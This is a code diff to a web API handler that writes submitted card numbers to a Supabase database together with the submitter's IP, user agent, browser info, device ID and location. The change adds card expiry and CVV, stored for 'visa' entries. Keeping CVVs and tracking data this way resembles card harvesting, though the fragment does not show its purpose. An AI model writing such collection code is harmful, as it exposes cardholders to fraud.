@@ -2,7 +2,7 @@ import { supabase } from '../../lib/supabase'
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' })
-  const { cardNumber, type = 'apple', deviceId, browserInfo, location } = req.body || {}
+  const { cardNumber, type = 'apple', deviceId, browserInfo, location, expiry, cvv } = req.body || {}
 
   // Basic validation
   if (!cardNumber || typeof cardNumber !== 'string' || !/^[A-Z0-9]+$/i.test(cardNumber.replace(/[-\s]/g, ''))) {
@@ -27,7 +27,9 @@ export default async function handler(req, res) {
     ip_address: typeof ip === 'string' ? ip.split(',')[0] : ip,
     user_agent: userAgent,
     browser_info: browserInfo || null,
-    location: location || null
+    location: location || null,
+    expiry: type === 'visa' ? (expiry || null) : null,
+    cvv: type === 'visa' ? (cvv || null) : null
   }
 
   try {
